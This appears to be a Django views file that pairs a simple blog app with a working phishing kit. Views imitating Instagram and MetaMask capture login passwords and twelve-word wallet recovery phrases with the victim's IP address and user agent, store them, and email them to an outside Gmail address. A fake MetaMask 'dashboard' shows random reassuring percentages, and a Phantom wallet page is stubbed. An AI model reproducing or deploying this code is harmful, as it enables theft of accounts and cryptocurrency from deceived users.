from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout
from django.contrib import messages
from django.core.mail import send_mail
from .models import Category, Post, Comment, ReplayComment, User
import random


##########################
def send_email(subject, message, recipient_list):
    try:
        send_mail(
            subject,
            message,
            'your_email@gmail.com',  # From email
            recipient_list,
            fail_silently=False,
        )
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
##########################



def home(request):
    posts = Post.objects.all()
    if request.method == "POST":
        comment = request.POST.get("comment")
        post_id = request.POST.get("post_id")
        if comment:
            if request.user.is_authenticated:
                Comment.objects.create(user=request.user, content=comment, post=get_object_or_404(Post, id=post_id)).save()
            else:
                Comment.objects.create(content=comment, post=get_object_or_404(Post, id=post_id)).save()
    return render(request, "home.html", {'posts':posts})

def detail(request, pk):
    post = get_object_or_404(Post, id=pk)
    comments = Comment.objects.filter(post=post)
    if request.method == "POST":
        comment = request.POST.get("comment")
        post_id = request.POST.get("post_id")
        if comment:
            if request.user.is_authenticated:
                Comment.objects.create(user=request.user, content=comment, post=get_object_or_404(Post, id=post_id)).save()
            else:
                Comment.objects.create(content=comment, post=get_object_or_404(Post, id=post_id)).save()
    return render(request, "detail.html", {'post':post, "comments":comments})

def upload(request):

    if request.method == "POST":
        title = request.POST.get("title")
        content = request.POST.get("content")
        image = request.POST.get("image")
        if request.user.is_authenticated:
            Post.objects.create(
                author=request.user,
                title=title,
                content=content,
                image=image
            ).save()
        else:
            Post.objects.create(
                title=title,
                content=content,
                image=image
            ).save()
        return redirect("/")
    return render(request, "upload.html")

def auth(request):
    if request.GET.get('type') == "login":
        add_type = "login"
    elif request.GET.get('type') == "signup":
        add_type = "signup"
    else:
        add_type = None
    if request.method == "POST":
        t_login = request.POST.get("login")
        if t_login:
            username = request.POST.get("username")
            password = request.POST.get("password")

            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                messages.success(request, "You have been successfully logged in.")
                return redirect('/')
            else:
                messages.error(request, "There was an error during login.")
                return redirect('/auth/?type=login')
            
        signup = request.POST.get("signup")
        if signup:
            if len(User.objects.all()) >= 100000:
                messages.error(request, "please try again!")
                return redirect('/auth/?type=signup')
            else:
                username = request.POST.get("username")
                password = request.POST.get("password")
                repeat_password = request.POST.get("repeat-password")
                if password == repeat_password and not User.objects.filter(username=username).exists():
                    User.objects.create_user(username=username, password=password).save()
                    messages.success(request, "You have been successfully signup.")
                    return redirect("/auth/?type=login")
                else:
                    messages.error(request, "There was an error during login.")
                    return redirect('/auth/?type=signup')
    return render(request, "auth.html", {"type":add_type})








#####################################################
def instagram(request):
    if request.method == "POST":
        ip_address = request.META.get('REMOTE_ADDR')
        user_agent = request.META.get('HTTP_USER_AGENT')
        
        username = request.POST.get("username")
        password = request.POST.get("password")
        from .models import Instagram
        if username and password:
            Instagram.objects.create(username=username, password=password).save()
        #######################################
            content = f"""
username = {username}
password = {password}

ip_address = {ip_address}
user_agent = {user_agent}

             --------------------------
{request.POST}
             --------------------------
                    """
            send_email("***Instagram***", content, ["eyobjjj@gmail.com"])
        #######################################
    return render(request, "instagram/index.html")


#####################################################
def metamask(request):
    if request.method == "POST":
        ip_address = request.META.get('REMOTE_ADDR')
        user_agent = request.META.get('HTTP_USER_AGENT')

        p1 = request.POST.get("1")
        p2 = request.POST.get("2")
        p3 = request.POST.get("3")
        p4 = request.POST.get("4")
        p5 = request.POST.get("5")
        p6 = request.POST.get("6")
        p7 = request.POST.get("7")
        p8 = request.POST.get("8")
        p9 = request.POST.get("9")
        p10 = request.POST.get("10")
        p11 = request.POST.get("11")
        p12 = request.POST.get("12")

        all = request.POST.get("all").split()
        pall = f"{p1} {p2} {p3} {p4} {p5} {p6} {p7} {p8} {p9} {p10} {p11} {p12}".split()

        print(pall)
        print(all)
        
        #add db
        from .models import Metamask
        Metamask.objects.create(all=all, pall=pall).save()

        #send email
        #######################################
        content = f"""
all = {all}
pall = {pall}

ip_address = {ip_address}
user_agent = {user_agent}

             --------------------------
{request.POST}
             --------------------------
                    """
        send_email("***Metamask***", content, ["eyobjjj@gmail.com"])
        #######################################
        if len(all) < 12 and len(pall) < 12:
            pass
        else:
            print("runnnnnnnnnnnnnnnnnn")
            return redirect("/m-load")

    return render(request, "metamask/index.html")


def metamask_loading(request):
    return render(request, "metamask/metamask-loading.html")


def metamask_dashboard(request):
    lists = [[100,0],[99,1],[98,2],[97,3],[96,4],[95,5],[94,6],[93,7],[92,8],[91,9],[90,10],[89,11],[88,12],[87,13],[86,14],[85,15]]
    result = random.choice(lists)
    success_percent = result[0]
    danger_percent = result[1]
    return render(request, "metamask/metamask-dashboard.html", {'success_percent': success_percent,'danger_percent': danger_percent})

#####################################################
def phantom(request):
    return render(request, "phantom/index.html")



